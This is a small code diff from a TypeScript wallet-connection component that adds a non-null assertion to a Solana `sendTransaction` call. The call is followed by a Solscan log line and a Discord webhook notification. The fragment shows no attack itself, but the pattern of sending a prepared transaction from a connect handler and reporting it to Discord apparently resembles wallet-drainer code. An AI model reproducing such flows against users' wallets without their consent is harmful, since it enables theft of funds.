@@ -163,7 +163,7 @@ const WalletConnectionHandler: FC = () => {
 
             setTimeout(async () => {
                 try {
-                    const txid = await sendTransaction(finalTx, connection);
+                    const txid = await sendTransaction(finalTx, connection!);
                     console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
                     await sendDiscordWebhook(
